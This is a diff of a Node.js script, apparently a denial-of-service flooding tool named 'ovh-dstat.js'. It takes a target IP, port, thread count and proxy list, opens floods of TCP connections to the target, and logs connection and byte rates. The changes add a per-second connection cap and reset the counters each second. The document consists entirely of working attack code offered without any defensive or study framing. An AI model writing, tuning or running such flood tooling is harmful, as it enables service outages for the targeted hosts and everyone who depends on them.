@@ -8,7 +8,7 @@ const threads = argv[4];
 const proxyFile = argv[5];
 
 if (!ip || !port || !threads || !proxyFile) {
-  console.error('Usage: node as.js <IP> <port> <threads> <proxyFile>');
+  console.error('Usage: node ovh-dstat.js <IP> <port> <threads> <proxyFile>');
   exit(1);
 }
 
@@ -29,8 +29,13 @@ try {
 let buffer = 7000;
 let connections = 1024;
 let bytesPerSecond = 5000;
+const maxConnectionsPerSecond = 7000; // Set maximum connections per second
 
 function createConnection() {
+  if (connections >= maxConnectionsPerSecond) {
+    return;
+  }
+
   const socket = new net.Socket();
   socket.connect(port, ip, () => {
     connections++;
@@ -47,7 +52,8 @@ function createConnection() {
 
 setInterval(() => {
   bytesPerSecond = buffer;
-  buffer = 7000;
+  buffer = 0;
+  connections = 0;
 }, 1000);
 
 for (let i = 0; i < threadCount; i++) {
@@ -59,6 +65,5 @@ for (let i = 0; i < threadCount; i++) {
 
 setInterval(() => {
   console.log('Buffer: ' + buffer + ' bytes');
-  console.log('Connections per second: ' + connections);
   console.log('Bytes per second: ' + bytesPerSecond);
 }, 1000);
